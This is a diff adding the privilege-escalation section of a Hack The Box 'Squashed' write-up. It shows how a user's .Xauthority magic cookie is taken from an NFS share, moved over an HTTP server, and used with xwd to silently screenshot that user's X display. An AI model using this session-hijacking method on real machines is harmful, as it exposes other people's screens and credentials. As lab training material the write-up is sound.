@@ -123,9 +123,80 @@ Checking my listener I can see that it caught the *reverse shell* and If I run a
 
 ![whoami](/docs/assets/images/HTB/squashed/squashed19.png)
 
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
 ![user flag](/docs/assets/images/HTB/squashed/squashed20.png)
 
 ---
 
 <ins> **Privilege Escalation** </ins>
+
+`Sudo –l` required a password, which has actually never happened to me before. So continuing to enumerate the file system I couldn't find much else for Alex but I did try to check out the user *ross'* files. I found a hidden file named *.Xauthority* that I didn't noticed the first time I went through the share on my host machine. 
+
+![.Xauthority](/docs/assets/images/HTB/squashed/squashed21.png)
+
+User *alex* doesn't have the permissions to view this file, but I'm pretty sure user *crumbles* has full permissions over the ross file share on my host machine. Navigating over to it sure enough I'm able to use `xxd` to decode the file and find the *MIT-MAGIC-COOKIE-1* value.
+
+![cookie](/docs/assets/images/HTB/squashed/squashed22.png)
+
+So what are the *.Xauthority* file and the *MIT-MAGIC-COOKIE-1* cookie value exactly? *.Xauthority* a file created by the *X Window System*, which is a graphical user interface. When a user logs into the graphical interface the *X server* generates a *unique magic cookie*, which is used to authenticate the user's connection to the server. The X server encrypts the cookie using the *mit-magic-cookie-1 protocol* and sends that encrypted cookie to the client. The client stores the encrypted cookie in the user's *.Xauthority* file, along with other authentication information. When the user runs a graphical application, the client sends the encrypted cookie back to the *X server*, which decrypts it using the secret key and verifies that the user is authenticated.
+
+In short for my purposes this means that anyone who has access to this file can log into the *X server* pretending to be the user associated with that *cookie*, sounds pretty simple. I just need to get this cookie over to user *alex*, which I can do by making a copy of the one on my host machine to send over from the /tmp directory then serve it up myself, acting as *alex*, over an http server using python.
+
+![copy cookie](/docs/assets/images/HTB/squashed/squashed23.png)
+
+`python3 -m htt.server 80`
+
+![python http server](/docs/assets/images/HTB/squashed/squashed24.png)
+
+`curl http://host_ip/.Xauthority -o /tmp/.Xauthority` < This is done from the terminal acting as *alex*.
+
+![curl](/docs/assets/images/HTB/squashed/squashed25.png)
+
+Now I can point the environment variable *XAUTHORITY* to the cookie and can in theory now interact with the display since I've hijacked ross' session. 
+
+`export XAUTHORITY=/tmp/.Xauthority`
+
+![export](/docs/assets/images/HTB/squashed/squashed26.png)
+
+I should be able to see what is happening on the display by taking a screenshot and then downloading the file to open it on my host machine. The first step is to use the `w` command to see which display is used by ross. The display will be listed in the *FROM* column of the command output, which in this case the name is *:0*.
+
+![display](/docs/assets/images/HTB/squashed/squashed27.png)
+
+There is a command called `xwd` that dumps an image of the *X window* graphical display. Using the man pages I'm able to see the `-help` switch will display the command usage.
+
+`man xwd`
+
+![man pages](/docs/assets/images/HTB/squashed/squashed28.png)
+
+`xwd -help`
+
+![help pages](/docs/assets/images/HTB/squashed/squashed29.png)
+
+I'm interested in `-root` to select the root window, `-screen` to send the request against the root window, `-silent` as a best practice to be sneaky about things, and `-display` to specify what to image dump. Putting it all together it looks like the following:
+
+`xwd –root –screen –silent –display :0 > /tmp/screen.xwd `
+
+![xwd](/docs/assets/images/HTB/squashed/squashed30.png)
+
+I use `ls` to verify that the *screen.xwd* file is actually there in the */tmp* directory and that everything worked, then once again use python to serve up the file over http. This time I chose port *8888* since there is already a webserver hosting on port *80* from this machine. 
+
+`python3 -m http.server 8888`
+
+![serve it up 2](/docs/assets/images/HTB/squashed/squashed31.png)
+
+Back on my host machine I used `wget` to download the file. I can then use the `convert` command to convert the file from *.xwd* X-Window screen dump image data to a *.png* image file that I can use the `xdg-open` command to open. 
+
+![convert](/docs/assets/images/HTB/squashed/squashed32.png)
+
+![open image](/docs/assets/images/HTB/squashed/squashed33.png)
+
+
+
+
+
+
+
+
+
 
